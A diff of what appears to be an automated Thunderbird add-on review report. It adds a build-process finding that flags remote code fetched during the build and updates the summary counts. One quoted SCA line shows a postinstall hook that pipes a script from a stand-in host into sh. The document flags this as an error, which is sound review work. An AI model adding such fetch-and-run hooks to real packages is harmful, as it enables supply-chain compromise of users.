@@ -42,7 +42,17 @@ Read more: https://webextension-api.thunderbird.net/en/mv3/guides/sourceCodeSubm
  - [SCA] package.json:6 - postinstall: curl https://x.example/i.sh | sh
  - [SCA] package.json:7 - prepare: node tools/gen.js
 
-2) Missing English localization: Read the strings this add-on shows the user. It
+2) Build process review: Confirm the build pulls ONLY from the dependencies
+   declared in package.json/lock - no remote code or resources from a raw URL,
+   curl/wget, a git clone of an unpinned repo, a CDN, or a postinstall hook. The
+   linter could not statically analyze part of the build (a network fetch in the
+   "postinstall" script), so what it found may be incomplete - check those steps
+   yourself.
+Suggested verdict: error
+Suggested response: The build must not fetch or execute code or resources from a remote source. Every part of the build must come only from the dependencies declared in package.json/lock (resolved from npm or the committed lock file).
+ - [SCA] package.json
+
+3) Missing English localization: Read the strings this add-on shows the user. It
    ships no English localization, so that text may be hardcoded in another
    language. English is Thunderbird's default, and most users who cannot read
    the hardcoded language will be able to read English. Report it unless the
@@ -135,5 +145,5 @@ Suggested response: An icon shipped inside this add-on imitates or incorporates 
 ── Summary ──
 
 6 error(s), 0 hold, 0 warning(s), 0 info,
-3 extended code review item(s), 0 extended manual review item(s),
+4 extended code review item(s), 0 extended manual review item(s),
 11 standard code review item(s), 0 standard manual review item(s)
